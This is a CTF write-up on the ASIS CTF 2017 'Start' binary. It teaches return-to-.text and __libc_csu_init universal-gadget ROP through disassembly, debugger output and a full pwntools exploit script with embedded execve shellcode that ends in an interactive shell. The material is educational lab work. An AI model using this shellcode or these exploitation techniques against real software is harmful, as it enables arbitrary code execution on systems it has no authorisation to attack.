# Return to .text section / Universal gadgets
## Circumvent mitigation techniques cause of lacking ROP gadgets or libc addy

--------------------------------------------------------------------------------
### Return to .text section
For this post I will use a task called "Start" from ASIS CTF 2017 as an simple but in my opinion extremely useful example
For this task you will be provided with a service that just allows you to put in data to it. At first let's check for mitigation mechanisms as usual

```
checksec --file ./Start $
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

So all the mechanisms all disabled...Back to the 90's ?
Let's take a look into the assembly code:

```
push rbp
mov rbp, rsp
sub rsp, 0x20
mov dword [rbp - 0x14], edi
mov qword [rbp - 0x20], rsi
lea rax, qword [rbp - 0x10]
mov edx, 0x400
mov rsi, rax
mov edi, 0
call sym.imp.read
mov eax, 0
leave
ret
```
Ok...reservation of 32 bytes after rbp for locals and it's storing our read input buffer on stack regardless of the string's length we provide.
It's a simple overflow bug with allows us to do a classical RIP overwrite.

But wait...There isn't any information leak returning us any stack or libc addy. And besides that the binary is extremely small, so we won't be lucky in searching for any gadgets that allow us to do any stack pivoting.
#### "Prepare for the worst..."
Luckily there is a technique called "return to text" which can bypass the lack of any good gadgets regardless if ASLR is enabled or not.
Cause that binary isn't compiled with PIE, .text and .bss sections won't be randomized. In short terms this technique works as follows:

1. Overwrite RIP by the address of any function that can read user supplied data (e.g. read, gets...called "A" below)
2. Set return address after "A"
3. Set argument of "A"
4. When running "A" will ask for input data
5. Inject shellcode
6. When "A" finishes it will directly jump to our shellcode

#### x86-64 syscalls
If the binary is compiled for amd64 architecture any arguments provided to a function call will be passed by registers.
First in rdi, second in rsi, third in rdx, then rcx, r8, r9 and so on. If other arguments have to pass, they will have been pushed on the stack. Syscall num is provided by rax (you can use a tool called "shellnoob" to bet syscall nums).

#### Lack of gadgets
If you open the binary in any ROP-finding toolset, you will just find a total of 62 gadgets. It seems not to be possible to use any meaningful combination to set all the registers.
One possibility for circumvent would be to check if we have any register pointing to a location within our input buffer.
And voilá...When ```main``` returns it doesn't clear the registers:

```
gdb ./Start $
Loaded 101 commands.  Type pwndbg [filter] for a list.
Reading symbols from ./Start...(no debugging symbols found)...done.
pwndbg> r < <(python -c 'print "A"*32')
Starting program: /home/felix/Dokumente/CTF/asisCTF_2017/Start/Start < <(python -c 'print "A"*32')

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400551 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[───────────────────────────────────────────────────REGISTERS───────────────────────────────────────────────────]
 RAX  0x0
 RBX  0x0
*RCX  0x7ffff7b165a0 (__read_nocancel+7) ◂— cmp    rax, -0xfff
*RDX  0x400
 RDI  0x0
*RSI  0x7fffffffe230 ◂— 'AAAAAAAAAAAAAAA...'
*R8   0x4005d0 ◂— ret
*R9   0x7ffff7de8a50 (_dl_fini) ◂— push   rbp
*R10  0x37b
*R11  0x246
*R12  0x400430 ◂— xor    ebp, ebp
*R13  0x7fffffffe320 ◂— 0x1
 R14  0x0
 R15  0x0
*RBP  0x4141414141414141 ('AAAAAAAA')
*RSP  0x7fffffffe248 ◂— 'AAAAAAAA\n'
*RIP  0x400551 ◂— ret
```

#### Exploit
So we just have to put return addy to rsi and go on with a pop rsi gadget.
Payload will consist into rwo parts:

1. padding(24 bytes) + pop_rsi + read + ret addy + garbage + read_plt + ret addy
2. shellcode

```python
#!/usr/bin/env python

from pwn import *

r=process("./Start")
elf=ELF("./Start")
context.os="linux"
context.arch="amd64"
scode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
read=elf.symbols['read']
pop_rsi_r15=0x004005c1
bss = elf.bss() + 0x100


def overwrite():
    padding = "\x90"*24
    payload = flat([padding,pop_rsi_r15, bss, "aaaabbbb", read, bss])
    log.info("Read  @ 0x{:08X}".format(read))
    log.info("BSS  @ 0x{:08X}".format(bss))
    raw_input("[DEBUG]")
    r.sendline(payload)
    r.sendline(scode)
    r.interactive()

def main():
    overwrite()
if __name__=="__main__":
    main()
```

### Using universal gadgets

We could also take advantage by the use of so called "universal gadgets"

>Every program before run into ```main()``` will call ```__libc_csu_init()```
>This function contains some useful gadgets to support you when preparing registers for sysalls

```
0000000000400550 <.__libc_csu_init>:

[*snip*]

4005a0:       4c 89 ea                mov    rdx,r13
4005a3:       4c 89 f6                mov    rsi,r14
4005a6:       44 89 ff                mov    edi,r15d
4005a9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]

[*snip*]

4005ba:       5b                      pop    rbx
4005bb:       5d                      pop    rbp
4005bc:       41 5c                   pop    r12
4005be:       41 5d                   pop    r13
4005c0:       41 5e                   pop    r14
4005c2:       41 5f                   pop    r15
4005c4:       c3                      ret
```

Last seven instructions will pop values to registers and then return. Main idea will be to call these instructions/gadgets and jump to the first four after all.
So the ROP chain will look like this:

Sequence 1:
| Instruction   | Expl                                                       |
|---------------|------------------------------------------------------------|
| pop rbx       | this register must be zero (it will be explained later on) |
| pop rbp       | must be equal to one                                       |
| pop r12       | address of instruction address                             |
| pop r13       | how many bytes to read                                     |
| pop r14       | destination address of shellcode (e.g. .bss + 0x100)       |
| pop r15       | some garbage                                               |
| ret           | put naxt garbage address                                   |

2. Sequence 2:

| mov rdx,r13                   | set 3rd argument                                           |
| mov rsi,r14                   | set 2nd argument                                           |                                  
| mov edi,r15d                  | [1]                                                        |                                  
| call QWORD PTR [r12+rbx*8]    | [2]                                                        |
| add rbx, 1                      | [3]                                                      |
| cmp rbx, rbp                    | [3]                                                        |
| jne 0x40059                     | [3]                                                        |
| add rsp, 0x8                    | [4]                                                        |                                    
| pop rbx                         | put garbage                                                |
| pop rbp                         | put garbage                                                |
| pop r12                         | put garbage                                                |
| pop r13                         | put garbage                                                |
| pop r14                         | put garbage                                                |
| pop r15                         | put garbage                                                |
| ret                             | .bss + 0x100                                               |
